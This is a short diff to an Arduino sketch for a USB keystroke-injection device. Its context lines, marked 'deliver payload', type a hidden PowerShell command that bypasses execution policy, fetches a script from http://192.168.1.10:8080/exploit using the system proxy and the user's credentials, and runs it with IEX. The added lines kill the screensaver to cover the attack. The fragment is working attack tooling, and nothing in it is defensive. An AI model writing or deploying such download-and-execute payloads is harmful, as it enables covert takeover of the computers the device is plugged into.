@@ -34,6 +34,11 @@ void setup() {
   //deliver payload
   powershell -ExecutionPolicy Bypass -WindowStyle hidden
   DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
+  
+  //turn off blank screen after everything is done
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(60);
+  DigiKeyboard.println("taskkill /im scrnsave.scr /f");
   }
 
 
